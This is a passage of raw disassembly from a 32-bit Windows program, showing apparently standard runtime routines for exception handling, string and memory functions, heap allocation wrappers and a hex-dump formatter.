  4021f8:	0b c0                	or     %eax,%eax
  4021fa:	74 7b                	je     0x402277
  4021fc:	83 fe ff             	cmp    $0xffffffff,%esi
  4021ff:	74 7d                	je     0x40227e
  402201:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  402204:	8b 44 8f 04          	mov    0x4(%edi,%ecx,4),%eax
  402208:	0b c0                	or     %eax,%eax
  40220a:	74 59                	je     0x402265
  40220c:	56                   	push   %esi
  40220d:	55                   	push   %ebp
  40220e:	8d 6b 10             	lea    0x10(%ebx),%ebp
  402211:	33 db                	xor    %ebx,%ebx
  402213:	33 c9                	xor    %ecx,%ecx
  402215:	33 d2                	xor    %edx,%edx
  402217:	33 f6                	xor    %esi,%esi
  402219:	33 ff                	xor    %edi,%edi
  40221b:	ff d0                	call   *%eax
  40221d:	5d                   	pop    %ebp
  40221e:	5e                   	pop    %esi
  40221f:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  402222:	0b c0                	or     %eax,%eax
  402224:	74 3f                	je     0x402265
  402226:	78 48                	js     0x402270
  402228:	8b 7b 08             	mov    0x8(%ebx),%edi
  40222b:	53                   	push   %ebx
  40222c:	e8 8f 00 00 00       	call   0x4022c0
  402231:	83 c4 04             	add    $0x4,%esp
  402234:	8d 6b 10             	lea    0x10(%ebx),%ebp
  402237:	56                   	push   %esi
  402238:	53                   	push   %ebx
  402239:	e8 dd 00 00 00       	call   0x40231b
  40223e:	83 c4 08             	add    $0x8,%esp
  402241:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  402244:	6a 01                	push   $0x1
  402246:	8b 44 8f 08          	mov    0x8(%edi,%ecx,4),%eax
  40224a:	e8 68 01 00 00       	call   0x4023b7
  40224f:	8b 04 8f             	mov    (%edi,%ecx,4),%eax
  402252:	89 43 0c             	mov    %eax,0xc(%ebx)
  402255:	8b 44 8f 08          	mov    0x8(%edi,%ecx,4),%eax
  402259:	33 db                	xor    %ebx,%ebx
  40225b:	33 c9                	xor    %ecx,%ecx
  40225d:	33 d2                	xor    %edx,%edx
  40225f:	33 f6                	xor    %esi,%esi
  402261:	33 ff                	xor    %edi,%edi
  402263:	ff d0                	call   *%eax
  402265:	8b 7b 08             	mov    0x8(%ebx),%edi
  402268:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  40226b:	8b 34 8f             	mov    (%edi,%ecx,4),%esi
  40226e:	eb 8c                	jmp    0x4021fc
  402270:	b8 00 00 00 00       	mov    $0x0,%eax
  402275:	eb 23                	jmp    0x40229a
  402277:	8b 45 08             	mov    0x8(%ebp),%eax
  40227a:	83 48 04 08          	orl    $0x8,0x4(%eax)
  40227e:	b8 01 00 00 00       	mov    $0x1,%eax
  402283:	eb 15                	jmp    0x40229a
  402285:	55                   	push   %ebp
  402286:	8d 6b 10             	lea    0x10(%ebx),%ebp
  402289:	6a ff                	push   $0xffffffff
  40228b:	53                   	push   %ebx
  40228c:	e8 8a 00 00 00       	call   0x40231b
  402291:	83 c4 08             	add    $0x8,%esp
  402294:	5d                   	pop    %ebp
  402295:	b8 01 00 00 00       	mov    $0x1,%eax
  40229a:	5d                   	pop    %ebp
  40229b:	5f                   	pop    %edi
  40229c:	5e                   	pop    %esi
  40229d:	5b                   	pop    %ebx
  40229e:	8b e5                	mov    %ebp,%esp
  4022a0:	5d                   	pop    %ebp
  4022a1:	c3                   	ret
  4022a2:	55                   	push   %ebp
  4022a3:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4022a7:	8b 29                	mov    (%ecx),%ebp
  4022a9:	8b 41 1c             	mov    0x1c(%ecx),%eax
  4022ac:	50                   	push   %eax
  4022ad:	8b 41 18             	mov    0x18(%ecx),%eax
  4022b0:	50                   	push   %eax
  4022b1:	e8 65 00 00 00       	call   0x40231b
  4022b6:	83 c4 08             	add    $0x8,%esp
  4022b9:	5d                   	pop    %ebp
  4022ba:	c2 04 00             	ret    $0x4
  4022bd:	cc                   	int3
  4022be:	cc                   	int3
  4022bf:	cc                   	int3
  4022c0:	55                   	push   %ebp
  4022c1:	8b ec                	mov    %esp,%ebp
  4022c3:	53                   	push   %ebx
  4022c4:	56                   	push   %esi
  4022c5:	57                   	push   %edi
  4022c6:	55                   	push   %ebp
  4022c7:	6a 00                	push   $0x0
  4022c9:	6a 00                	push   $0x0
  4022cb:	68 d8 22 40 00       	push   $0x4022d8
  4022d0:	ff 75 08             	push   0x8(%ebp)
  4022d3:	e8 08 81 00 00       	call   0x40a3e0
  4022d8:	5d                   	pop    %ebp
  4022d9:	5f                   	pop    %edi
  4022da:	5e                   	pop    %esi
  4022db:	5b                   	pop    %ebx
  4022dc:	8b e5                	mov    %ebp,%esp
  4022de:	5d                   	pop    %ebp
  4022df:	c3                   	ret
  4022e0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4022e4:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  4022eb:	b8 01 00 00 00       	mov    $0x1,%eax
  4022f0:	74 28                	je     0x40231a
  4022f2:	8b 44 24 14          	mov    0x14(%esp),%eax
  4022f6:	55                   	push   %ebp
  4022f7:	8b 68 10             	mov    0x10(%eax),%ebp
  4022fa:	8b 50 28             	mov    0x28(%eax),%edx
  4022fd:	52                   	push   %edx
  4022fe:	8b 50 24             	mov    0x24(%eax),%edx
  402301:	52                   	push   %edx
  402302:	e8 14 00 00 00       	call   0x40231b
  402307:	83 c4 08             	add    $0x8,%esp
  40230a:	5d                   	pop    %ebp
  40230b:	8b 44 24 08          	mov    0x8(%esp),%eax
  40230f:	8b 54 24 10          	mov    0x10(%esp),%edx
  402313:	89 02                	mov    %eax,(%edx)
  402315:	b8 03 00 00 00       	mov    $0x3,%eax
  40231a:	c3                   	ret
  40231b:	53                   	push   %ebx
  40231c:	56                   	push   %esi
  40231d:	57                   	push   %edi
  40231e:	8b 44 24 10          	mov    0x10(%esp),%eax
  402322:	55                   	push   %ebp
  402323:	50                   	push   %eax
  402324:	6a fe                	push   $0xfffffffe
  402326:	68 e0 22 40 00       	push   $0x4022e0
  40232b:	64 ff 35 00 00 00 00 	push   %fs:0x0
  402332:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402339:	8b 44 24 24          	mov    0x24(%esp),%eax
  40233d:	8b 58 08             	mov    0x8(%eax),%ebx
  402340:	8b 70 0c             	mov    0xc(%eax),%esi
  402343:	83 fe ff             	cmp    $0xffffffff,%esi
  402346:	74 35                	je     0x40237d
  402348:	83 7c 24 28 ff       	cmpl   $0xffffffff,0x28(%esp)
  40234d:	74 06                	je     0x402355
  40234f:	3b 74 24 28          	cmp    0x28(%esp),%esi
  402353:	76 28                	jbe    0x40237d
  402355:	8d 34 76             	lea    (%esi,%esi,2),%esi
  402358:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  40235b:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  40235f:	89 48 0c             	mov    %ecx,0xc(%eax)
  402362:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  402367:	75 12                	jne    0x40237b
  402369:	68 01 01 00 00       	push   $0x101
  40236e:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  402372:	e8 40 00 00 00       	call   0x4023b7
  402377:	ff 54 b3 08          	call   *0x8(%ebx,%esi,4)
  40237b:	eb bc                	jmp    0x402339
  40237d:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  402384:	83 c4 10             	add    $0x10,%esp
  402387:	5f                   	pop    %edi
  402388:	5e                   	pop    %esi
  402389:	5b                   	pop    %ebx
  40238a:	c3                   	ret
  40238b:	33 c0                	xor    %eax,%eax
  40238d:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  402394:	81 79 04 e0 22 40 00 	cmpl   $0x4022e0,0x4(%ecx)
  40239b:	75 10                	jne    0x4023ad
  40239d:	8b 51 0c             	mov    0xc(%ecx),%edx
  4023a0:	8b 52 0c             	mov    0xc(%edx),%edx
  4023a3:	39 51 08             	cmp    %edx,0x8(%ecx)
  4023a6:	75 05                	jne    0x4023ad
  4023a8:	b8 01 00 00 00       	mov    $0x1,%eax
  4023ad:	c3                   	ret
  4023ae:	53                   	push   %ebx
  4023af:	51                   	push   %ecx
  4023b0:	bb 34 19 40 00       	mov    $0x401934,%ebx
  4023b5:	eb 0a                	jmp    0x4023c1
  4023b7:	53                   	push   %ebx
  4023b8:	51                   	push   %ecx
  4023b9:	bb 34 19 40 00       	mov    $0x401934,%ebx
  4023be:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4023c1:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4023c4:	89 43 04             	mov    %eax,0x4(%ebx)
  4023c7:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  4023ca:	55                   	push   %ebp
  4023cb:	51                   	push   %ecx
  4023cc:	50                   	push   %eax
  4023cd:	58                   	pop    %eax
  4023ce:	59                   	pop    %ecx
  4023cf:	5d                   	pop    %ebp
  4023d0:	59                   	pop    %ecx
  4023d1:	5b                   	pop    %ebx
  4023d2:	c2 04 00             	ret    $0x4
  4023d5:	8b ff                	mov    %edi,%edi
  4023d7:	55                   	push   %ebp
  4023d8:	8b ec                	mov    %esp,%ebp
  4023da:	83 ec 20             	sub    $0x20,%esp
  4023dd:	53                   	push   %ebx
  4023de:	56                   	push   %esi
  4023df:	8b 75 08             	mov    0x8(%ebp),%esi
  4023e2:	8b 5e 08             	mov    0x8(%esi),%ebx
  4023e5:	f6 c3 03             	test   $0x3,%bl
  4023e8:	75 1c                	jne    0x402406
  4023ea:	64 a1 04 00 00 00    	mov    %fs:0x4,%eax
  4023f0:	89 45 08             	mov    %eax,0x8(%ebp)
  4023f3:	64 a1 08 00 00 00    	mov    %fs:0x8,%eax
  4023f9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4023fc:	3b 5d fc             	cmp    -0x4(%ebp),%ebx
  4023ff:	72 0c                	jb     0x40240d
  402401:	3b 5d 08             	cmp    0x8(%ebp),%ebx
  402404:	73 07                	jae    0x40240d
  402406:	33 c0                	xor    %eax,%eax
  402408:	e9 e6 01 00 00       	jmp    0x4025f3
  40240d:	57                   	push   %edi
  40240e:	8b 7e 0c             	mov    0xc(%esi),%edi
  402411:	83 ff ff             	cmp    $0xffffffff,%edi
  402414:	75 08                	jne    0x40241e
  402416:	33 c0                	xor    %eax,%eax
  402418:	40                   	inc    %eax
  402419:	e9 d4 01 00 00       	jmp    0x4025f2
  40241e:	33 d2                	xor    %edx,%edx
  402420:	89 55 08             	mov    %edx,0x8(%ebp)
  402423:	8b c3                	mov    %ebx,%eax
  402425:	8b 08                	mov    (%eax),%ecx
  402427:	83 f9 ff             	cmp    $0xffffffff,%ecx
  40242a:	74 04                	je     0x402430
  40242c:	3b ca                	cmp    %edx,%ecx
  40242e:	73 64                	jae    0x402494
  402430:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402434:	74 03                	je     0x402439
  402436:	ff 45 08             	incl   0x8(%ebp)
  402439:	42                   	inc    %edx
  40243a:	83 c0 0c             	add    $0xc,%eax
  40243d:	3b d7                	cmp    %edi,%edx
  40243f:	76 e4                	jbe    0x402425
  402441:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  402445:	74 0c                	je     0x402453
  402447:	8b 46 f8             	mov    -0x8(%esi),%eax
  40244a:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  40244d:	72 45                	jb     0x402494
  40244f:	3b c6                	cmp    %esi,%eax
  402451:	73 41                	jae    0x402494
  402453:	8b 0d 40 ca 40 00    	mov    0x40ca40,%ecx
  402459:	8b f3                	mov    %ebx,%esi
  40245b:	81 e6 00 f0 ff ff    	and    $0xfffff000,%esi
  402461:	33 c0                	xor    %eax,%eax
  402463:	85 c9                	test   %ecx,%ecx
  402465:	7e 0e                	jle    0x402475
  402467:	39 34 85 48 ca 40 00 	cmp    %esi,0x40ca48(,%eax,4)
  40246e:	74 2b                	je     0x40249b
  402470:	40                   	inc    %eax
  402471:	3b c1                	cmp    %ecx,%eax
  402473:	7c f2                	jl     0x402467
  402475:	8d 45 08             	lea    0x8(%ebp),%eax
  402478:	50                   	push   %eax
  402479:	6a 1c                	push   $0x1c
  40247b:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40247e:	50                   	push   %eax
  40247f:	6a 00                	push   $0x0
  402481:	53                   	push   %ebx
  402482:	83 cf ff             	or     $0xffffffff,%edi
  402485:	57                   	push   %edi
  402486:	e8 5b 7f 00 00       	call   0x40a3e6
  40248b:	85 c0                	test   %eax,%eax
  40248d:	7c 7c                	jl     0x40250b
  40248f:	8b 45 08             	mov    0x8(%ebp),%eax
  402492:	eb 79                	jmp    0x40250d
  402494:	33 c0                	xor    %eax,%eax
  402496:	e9 57 01 00 00       	jmp    0x4025f2
  40249b:	85 c0                	test   %eax,%eax
  40249d:	0f 8e 73 ff ff ff    	jle    0x402416
  4024a3:	33 d2                	xor    %edx,%edx
  4024a5:	bb 88 ca 40 00       	mov    $0x40ca88,%ebx
  4024aa:	42                   	inc    %edx
  4024ab:	8b fb                	mov    %ebx,%edi
  4024ad:	87 17                	xchg   %edx,(%edi)
  4024af:	85 d2                	test   %edx,%edx
  4024b1:	0f 85 5f ff ff ff    	jne    0x402416
  4024b7:	39 34 85 48 ca 40 00 	cmp    %esi,0x40ca48(,%eax,4)
  4024be:	74 2a                	je     0x4024ea
  4024c0:	8d 41 ff             	lea    -0x1(%ecx),%eax
  4024c3:	85 c0                	test   %eax,%eax
  4024c5:	7c 10                	jl     0x4024d7
  4024c7:	39 34 85 48 ca 40 00 	cmp    %esi,0x40ca48(,%eax,4)
  4024ce:	74 03                	je     0x4024d3
  4024d0:	48                   	dec    %eax
  4024d1:	79 f4                	jns    0x4024c7
  4024d3:	85 c0                	test   %eax,%eax
  4024d5:	7d 11                	jge    0x4024e8
  4024d7:	83 f9 10             	cmp    $0x10,%ecx
  4024da:	7d 07                	jge    0x4024e3
  4024dc:	41                   	inc    %ecx
  4024dd:	89 0d 40 ca 40 00    	mov    %ecx,0x40ca40
  4024e3:	8d 41 ff             	lea    -0x1(%ecx),%eax
  4024e6:	eb 02                	jmp    0x4024ea
  4024e8:	74 18                	je     0x402502
  4024ea:	33 d2                	xor    %edx,%edx
  4024ec:	85 c0                	test   %eax,%eax
  4024ee:	7c 12                	jl     0x402502
  4024f0:	8d 0c 95 48 ca 40 00 	lea    0x40ca48(,%edx,4),%ecx
  4024f7:	8b 39                	mov    (%ecx),%edi
  4024f9:	42                   	inc    %edx
  4024fa:	3b d0                	cmp    %eax,%edx
  4024fc:	89 31                	mov    %esi,(%ecx)
  4024fe:	8b f7                	mov    %edi,%esi
  402500:	7e ee                	jle    0x4024f0
  402502:	33 c0                	xor    %eax,%eax
  402504:	87 03                	xchg   %eax,(%ebx)
  402506:	e9 0b ff ff ff       	jmp    0x402416
  40250b:	33 c0                	xor    %eax,%eax
  40250d:	85 c0                	test   %eax,%eax
  40250f:	0f 84 db 00 00 00    	je     0x4025f0
  402515:	81 7d f8 00 00 00 01 	cmpl   $0x1000000,-0x8(%ebp)
  40251c:	0f 85 ce 00 00 00    	jne    0x4025f0
  402522:	f6 45 f4 cc          	testb  $0xcc,-0xc(%ebp)
  402526:	74 5a                	je     0x402582
  402528:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40252b:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%ecx)
  402530:	0f 85 ba 00 00 00    	jne    0x4025f0
  402536:	8b 41 3c             	mov    0x3c(%ecx),%eax
  402539:	03 c1                	add    %ecx,%eax
  40253b:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  402541:	0f 85 a9 00 00 00    	jne    0x4025f0
  402547:	66 81 78 18 0b 01    	cmpw   $0x10b,0x18(%eax)
  40254d:	0f 85 9d 00 00 00    	jne    0x4025f0
  402553:	2b d9                	sub    %ecx,%ebx
  402555:	66 83 78 06 00       	cmpw   $0x0,0x6(%eax)
  40255a:	0f b7 48 14          	movzwl 0x14(%eax),%ecx
  40255e:	8d 4c 01 18          	lea    0x18(%ecx,%eax,1),%ecx
  402562:	0f 86 88 00 00 00    	jbe    0x4025f0
  402568:	8b 41 0c             	mov    0xc(%ecx),%eax
  40256b:	3b d8                	cmp    %eax,%ebx
  40256d:	72 13                	jb     0x402582
  40256f:	8b 51 08             	mov    0x8(%ecx),%edx
  402572:	03 d0                	add    %eax,%edx
  402574:	3b da                	cmp    %edx,%ebx
  402576:	73 0a                	jae    0x402582
  402578:	f6 41 27 80          	testb  $0x80,0x27(%ecx)
  40257c:	0f 85 12 ff ff ff    	jne    0x402494
  402582:	33 c0                	xor    %eax,%eax
  402584:	40                   	inc    %eax
  402585:	8b c8                	mov    %eax,%ecx
  402587:	ba 88 ca 40 00       	mov    $0x40ca88,%edx
  40258c:	87 0a                	xchg   %ecx,(%edx)
  40258e:	85 c9                	test   %ecx,%ecx
  402590:	75 60                	jne    0x4025f2
  402592:	8b 0d 40 ca 40 00    	mov    0x40ca40,%ecx
  402598:	85 c9                	test   %ecx,%ecx
  40259a:	8b d1                	mov    %ecx,%edx
  40259c:	7e 13                	jle    0x4025b1
  40259e:	8d 04 8d 44 ca 40 00 	lea    0x40ca44(,%ecx,4),%eax
  4025a5:	39 30                	cmp    %esi,(%eax)
  4025a7:	74 08                	je     0x4025b1
  4025a9:	4a                   	dec    %edx
  4025aa:	83 e8 04             	sub    $0x4,%eax
  4025ad:	85 d2                	test   %edx,%edx
  4025af:	7f f4                	jg     0x4025a5
  4025b1:	85 d2                	test   %edx,%edx
  4025b3:	75 2d                	jne    0x4025e2
  4025b5:	6a 0f                	push   $0xf
  4025b7:	5b                   	pop    %ebx
  4025b8:	3b cb                	cmp    %ebx,%ecx
  4025ba:	7f 02                	jg     0x4025be
  4025bc:	8b d9                	mov    %ecx,%ebx
  4025be:	33 d2                	xor    %edx,%edx
  4025c0:	85 db                	test   %ebx,%ebx
  4025c2:	7c 12                	jl     0x4025d6
  4025c4:	8d 04 95 48 ca 40 00 	lea    0x40ca48(,%edx,4),%eax
  4025cb:	8b 38                	mov    (%eax),%edi
  4025cd:	42                   	inc    %edx
  4025ce:	3b d3                	cmp    %ebx,%edx
  4025d0:	89 30                	mov    %esi,(%eax)
  4025d2:	8b f7                	mov    %edi,%esi
  4025d4:	7e ee                	jle    0x4025c4
  4025d6:	83 f9 10             	cmp    $0x10,%ecx
  4025d9:	7d 07                	jge    0x4025e2
  4025db:	41                   	inc    %ecx
  4025dc:	89 0d 40 ca 40 00    	mov    %ecx,0x40ca40
  4025e2:	33 c0                	xor    %eax,%eax
  4025e4:	b9 88 ca 40 00       	mov    $0x40ca88,%ecx
  4025e9:	87 01                	xchg   %eax,(%ecx)
  4025eb:	e9 26 fe ff ff       	jmp    0x402416
  4025f0:	8b c7                	mov    %edi,%eax
  4025f2:	5f                   	pop    %edi
  4025f3:	5e                   	pop    %esi
  4025f4:	5b                   	pop    %ebx
  4025f5:	c9                   	leave
  4025f6:	c3                   	ret
  4025f7:	cc                   	int3
  4025f8:	55                   	push   %ebp
  4025f9:	8b ec                	mov    %esp,%ebp
  4025fb:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4025fe:	85 c9                	test   %ecx,%ecx
  402600:	75 04                	jne    0x402606
  402602:	33 c0                	xor    %eax,%eax
  402604:	5d                   	pop    %ebp
  402605:	c3                   	ret
  402606:	8b 55 0c             	mov    0xc(%ebp),%edx
  402609:	56                   	push   %esi
  40260a:	8b 75 08             	mov    0x8(%ebp),%esi
  40260d:	49                   	dec    %ecx
  40260e:	74 0a                	je     0x40261a
  402610:	8a 06                	mov    (%esi),%al
  402612:	3a 02                	cmp    (%edx),%al
  402614:	75 04                	jne    0x40261a
  402616:	46                   	inc    %esi
  402617:	42                   	inc    %edx
  402618:	eb f3                	jmp    0x40260d
  40261a:	0f b6 06             	movzbl (%esi),%eax
  40261d:	0f b6 0a             	movzbl (%edx),%ecx
  402620:	2b c1                	sub    %ecx,%eax
  402622:	5e                   	pop    %esi
  402623:	5d                   	pop    %ebp
  402624:	c3                   	ret
  402625:	8b 44 24 04          	mov    0x4(%esp),%eax
  402629:	56                   	push   %esi
  40262a:	8b 74 24 10          	mov    0x10(%esp),%esi
  40262e:	85 f6                	test   %esi,%esi
  402630:	74 13                	je     0x402645
  402632:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402636:	57                   	push   %edi
  402637:	8b f8                	mov    %eax,%edi
  402639:	2b fa                	sub    %edx,%edi
  40263b:	8a 0a                	mov    (%edx),%cl
  40263d:	88 0c 17             	mov    %cl,(%edi,%edx,1)
  402640:	42                   	inc    %edx
  402641:	4e                   	dec    %esi
  402642:	75 f7                	jne    0x40263b
  402644:	5f                   	pop    %edi
  402645:	5e                   	pop    %esi
  402646:	c3                   	ret
  402647:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40264b:	85 c9                	test   %ecx,%ecx
  40264d:	74 21                	je     0x402670
  40264f:	0f b6 44 24 08       	movzbl 0x8(%esp),%eax
  402654:	56                   	push   %esi
  402655:	8b f1                	mov    %ecx,%esi
  402657:	69 c0 01 01 01 01    	imul   $0x1010101,%eax,%eax
  40265d:	57                   	push   %edi
  40265e:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  402662:	c1 e9 02             	shr    $0x2,%ecx
  402665:	f3 ab                	rep stos %eax,%es:(%edi)
  402667:	8b ce                	mov    %esi,%ecx
  402669:	83 e1 03             	and    $0x3,%ecx
  40266c:	f3 aa                	rep stos %al,%es:(%edi)
  40266e:	5f                   	pop    %edi
  40266f:	5e                   	pop    %esi
  402670:	8b 44 24 04          	mov    0x4(%esp),%eax
  402674:	c3                   	ret
  402675:	8b 54 24 08          	mov    0x8(%esp),%edx
  402679:	53                   	push   %ebx
  40267a:	56                   	push   %esi
  40267b:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40267f:	8a 1a                	mov    (%edx),%bl
  402681:	0f b6 c3             	movzbl %bl,%eax
  402684:	0f b6 0e             	movzbl (%esi),%ecx
  402687:	2b c8                	sub    %eax,%ecx
  402689:	75 14                	jne    0x40269f
  40268b:	2b f2                	sub    %edx,%esi
  40268d:	84 db                	test   %bl,%bl
  40268f:	74 0e                	je     0x40269f
  402691:	42                   	inc    %edx
  402692:	8a 1a                	mov    (%edx),%bl
  402694:	0f b6 0c 16          	movzbl (%esi,%edx,1),%ecx
  402698:	0f b6 c3             	movzbl %bl,%eax
  40269b:	2b c8                	sub    %eax,%ecx
  40269d:	74 ee                	je     0x40268d
  40269f:	5e                   	pop    %esi
  4026a0:	5b                   	pop    %ebx
  4026a1:	85 c9                	test   %ecx,%ecx
  4026a3:	79 05                	jns    0x4026aa
  4026a5:	83 c9 ff             	or     $0xffffffff,%ecx
  4026a8:	eb 05                	jmp    0x4026af
  4026aa:	7e 03                	jle    0x4026af
  4026ac:	33 c9                	xor    %ecx,%ecx
  4026ae:	41                   	inc    %ecx
  4026af:	8b c1                	mov    %ecx,%eax
  4026b1:	c3                   	ret
  4026b2:	55                   	push   %ebp
  4026b3:	8b ec                	mov    %esp,%ebp
  4026b5:	83 ec 20             	sub    $0x20,%esp
  4026b8:	33 c0                	xor    %eax,%eax
  4026ba:	56                   	push   %esi
  4026bb:	8b 75 0c             	mov    0xc(%ebp),%esi
  4026be:	57                   	push   %edi
  4026bf:	6a 08                	push   $0x8
  4026c1:	59                   	pop    %ecx
  4026c2:	8d 7d e0             	lea    -0x20(%ebp),%edi
  4026c5:	f3 ab                	rep stos %eax,%es:(%edi)
  4026c7:	53                   	push   %ebx
  4026c8:	8a 1e                	mov    (%esi),%bl
  4026ca:	b0 01                	mov    $0x1,%al
  4026cc:	0f be cb             	movsbl %bl,%ecx
  4026cf:	8b d1                	mov    %ecx,%edx
  4026d1:	83 e1 07             	and    $0x7,%ecx
  4026d4:	c1 fa 03             	sar    $0x3,%edx
  4026d7:	d2 e0                	shl    %cl,%al
  4026d9:	08 44 15 e0          	or     %al,-0x20(%ebp,%edx,1)
  4026dd:	46                   	inc    %esi
  4026de:	84 db                	test   %bl,%bl
  4026e0:	75 e6                	jne    0x4026c8
  4026e2:	8b 75 08             	mov    0x8(%ebp),%esi
  4026e5:	85 f6                	test   %esi,%esi
  4026e7:	75 0d                	jne    0x4026f6
  4026e9:	8b 35 00 a4 40 00    	mov    0x40a400,%esi
  4026ef:	eb 05                	jmp    0x4026f6
  4026f1:	84 db                	test   %bl,%bl
  4026f3:	74 19                	je     0x40270e
  4026f5:	46                   	inc    %esi
  4026f6:	8a 1e                	mov    (%esi),%bl
  4026f8:	33 c0                	xor    %eax,%eax
  4026fa:	0f be d3             	movsbl %bl,%edx
  4026fd:	40                   	inc    %eax
  4026fe:	8b ca                	mov    %edx,%ecx
  402700:	c1 fa 03             	sar    $0x3,%edx
  402703:	83 e1 07             	and    $0x7,%ecx
  402706:	d3 e0                	shl    %cl,%eax
  402708:	84 44 15 e0          	test   %al,-0x20(%ebp,%edx,1)
  40270c:	75 e3                	jne    0x4026f1
  40270e:	8b fe                	mov    %esi,%edi
  402710:	5b                   	pop    %ebx
  402711:	eb 17                	jmp    0x40272a
  402713:	0f be 16             	movsbl (%esi),%edx
  402716:	33 c0                	xor    %eax,%eax
  402718:	8b ca                	mov    %edx,%ecx
  40271a:	40                   	inc    %eax
  40271b:	83 e1 07             	and    $0x7,%ecx
  40271e:	c1 fa 03             	sar    $0x3,%edx
  402721:	d3 e0                	shl    %cl,%eax
  402723:	84 44 15 e0          	test   %al,-0x20(%ebp,%edx,1)
  402727:	75 08                	jne    0x402731
  402729:	46                   	inc    %esi
  40272a:	80 3e 00             	cmpb   $0x0,(%esi)
  40272d:	75 e4                	jne    0x402713
  40272f:	eb 04                	jmp    0x402735
  402731:	c6 06 00             	movb   $0x0,(%esi)
  402734:	46                   	inc    %esi
  402735:	8b c7                	mov    %edi,%eax
  402737:	89 35 00 a4 40 00    	mov    %esi,0x40a400
  40273d:	2b c6                	sub    %esi,%eax
  40273f:	f7 d8                	neg    %eax
  402741:	1b c0                	sbb    %eax,%eax
  402743:	23 c7                	and    %edi,%eax
  402745:	5f                   	pop    %edi
  402746:	5e                   	pop    %esi
  402747:	8b e5                	mov    %ebp,%esp
  402749:	5d                   	pop    %ebp
  40274a:	c3                   	ret
  40274b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40274f:	0f af 44 24 08       	imul   0x8(%esp),%eax
  402754:	50                   	push   %eax
  402755:	6a 08                	push   $0x8
  402757:	ff 15 c4 10 40 00    	call   *0x4010c4
  40275d:	50                   	push   %eax
  40275e:	ff 15 d4 10 40 00    	call   *0x4010d4
  402764:	c3                   	ret
  402765:	ff 74 24 04          	push   0x4(%esp)
  402769:	6a 00                	push   $0x0
  40276b:	ff 15 c4 10 40 00    	call   *0x4010c4
  402771:	50                   	push   %eax
  402772:	ff 15 c8 10 40 00    	call   *0x4010c8
  402778:	c3                   	ret
  402779:	ff 74 24 04          	push   0x4(%esp)
  40277d:	6a 00                	push   $0x0
  40277f:	ff 15 c4 10 40 00    	call   *0x4010c4
  402785:	50                   	push   %eax
  402786:	ff 15 d4 10 40 00    	call   *0x4010d4
  40278c:	c3                   	ret
  40278d:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  402792:	ff 74 24 08          	push   0x8(%esp)
  402796:	74 14                	je     0x4027ac
  402798:	ff 74 24 08          	push   0x8(%esp)
  40279c:	6a 00                	push   $0x0
  40279e:	ff 15 c4 10 40 00    	call   *0x4010c4
  4027a4:	50                   	push   %eax
  4027a5:	ff 15 cc 10 40 00    	call   *0x4010cc
  4027ab:	c3                   	ret
  4027ac:	6a 00                	push   $0x0
  4027ae:	ff 15 c4 10 40 00    	call   *0x4010c4
  4027b4:	50                   	push   %eax
  4027b5:	ff 15 d4 10 40 00    	call   *0x4010d4
  4027bb:	c3                   	ret
  4027bc:	53                   	push   %ebx
  4027bd:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4027c1:	55                   	push   %ebp
  4027c2:	56                   	push   %esi
  4027c3:	57                   	push   %edi
  4027c4:	68 00 04 00 00       	push   $0x400
  4027c9:	6a 00                	push   $0x0
  4027cb:	53                   	push   %ebx
  4027cc:	e8 76 fe ff ff       	call   0x402647
  4027d1:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  4027d5:	8d 53 02             	lea    0x2(%ebx),%edx
  4027d8:	33 f6                	xor    %esi,%esi
  4027da:	83 c4 0c             	add    $0xc,%esp
  4027dd:	46                   	inc    %esi
  4027de:	33 ff                	xor    %edi,%edi
  4027e0:	0f b6 0c 2f          	movzbl (%edi,%ebp,1),%ecx
  4027e4:	8b c1                	mov    %ecx,%eax
  4027e6:	83 e1 0f             	and    $0xf,%ecx
  4027e9:	c1 e8 04             	shr    $0x4,%eax
  4027ec:	8a 80 4c 19 40 00    	mov    0x40194c(%eax),%al
  4027f2:	88 42 fe             	mov    %al,-0x2(%edx)
  4027f5:	8a 81 4c 19 40 00    	mov    0x40194c(%ecx),%al
  4027fb:	88 42 ff             	mov    %al,-0x1(%edx)
  4027fe:	83 fe 10             	cmp    $0x10,%esi
  402801:	74 05                	je     0x402808
  402803:	c6 02 20             	movb   $0x20,(%edx)
  402806:	eb 05                	jmp    0x40280d
  402808:	c6 02 0a             	movb   $0xa,(%edx)
  40280b:	33 f6                	xor    %esi,%esi
  40280d:	83 c2 03             	add    $0x3,%edx
  402810:	47                   	inc    %edi
  402811:	46                   	inc    %esi
  402812:	81 ff 00 01 00 00    	cmp    $0x100,%edi
  402818:	7c c6                	jl     0x4027e0
  40281a:	5f                   	pop    %edi
  40281b:	5e                   	pop    %esi
  40281c:	5d                   	pop    %ebp
  40281d:	c6 83 ff 03 00 00 00 	movb   $0x0,0x3ff(%ebx)
